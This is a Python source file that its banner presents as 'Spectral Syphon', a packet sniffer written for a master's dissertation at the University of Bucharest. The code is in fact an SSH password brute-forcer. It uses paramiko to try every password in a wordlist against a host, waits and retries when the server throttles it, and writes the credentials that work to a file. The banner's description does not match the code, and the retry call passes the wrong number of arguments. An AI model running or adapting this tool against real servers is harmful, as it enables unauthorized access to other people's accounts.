###########################################################################
###########################################################################
###########################################################################
###########                                                     ###########
###########                  SPECTRAL SYPHON                    ###########
###########                   Packet sniffer                    ###########
###########                    Version 1.0                      ###########
###########                                                     ###########
###########               PROIECT DE DISERTATIE                 ###########
###########         Author: Ion-Margarit Adrian-Florin          ###########
###########       Facultatea de Matematica si Informatica       ###########
###########             Universitatea din Bucuresti             ###########
###########                                                     ###########
###########################################################################
###########################################################################
###########################################################################


import paramiko
import socket
import time
import sys
from colorama import Fore, Back, Style


def openSSH(service, host, user, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, username=user,
                       password=password, timeout=5)

    # If the host is unreachable
    except socket.timeout:
        print(
            f'{Fore.GREEN}[---]{Style.RESET_ALL}{Fore.RED}Failed to connect to {host} with {user}:{password}. Error: Host unreachable!{Style.RESET_ALL}')
        return False

    # if the credentials are wrong
    except paramiko.AuthenticationException:
        print(f'{Fore.GREEN}[---]{Style.RESET_ALL}{Fore.RED}Failed to connect to {host} with {user}:{password}. Error: Authentication failed!{Style.RESET_ALL}')
        return False

    # If the connection is refused
    except paramiko.SSHException:
        print(f'{Fore.GREEN}[---]{Style.RESET_ALL}{Fore.RED}Failed to connect to {host} with {user}:{password}. Error: quota exceeded! Retrying with one minute delay.{Style.RESET_ALL}')
        try:
            # Wait for one minute
            time.sleep(60)
            return openSSH(host, user, password)
        except Exception as e:
            print(
                f'{Fore.GREEN}[---]{Style.RESET_ALL}{Fore.RED}Failed to connect to {host} with {user}:{password}. Error: {e}{Style.RESET_ALL}')

    except Exception as e:
        print(
            f'{Fore.GREEN}[---]{Style.RESET_ALL}{Fore.RED}Failed to connect to {host} with {user}:{password}. Error: {e}{Style.RESET_ALL}')
        sys.exit()

    except KeyboardInterrupt:
        sys.exit()

    else:
        # If the connection is successful
        print(
            f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.GREEN}Successfully connected to {host} with {user}:{password}{Style.RESET_ALL}')
        return True


def bruteforce(service, host, user, wordlist):
    try:
        pwd_list = open(wordlist).read().splitlines()
    except Exception as e:
        print(
            f'{Fore.GREEN}[---]{Style.RESET_ALL}{Fore.RED}Failed to open {wordlist}. Error: {e}{Style.RESET_ALL}')
    else:
        for pwd in pwd_list:
            if openSSH(service, host, user, pwd):
                open(f'credentials_{host}.txt', 'a').write(
                    f'{user}@{host}:{pwd}')
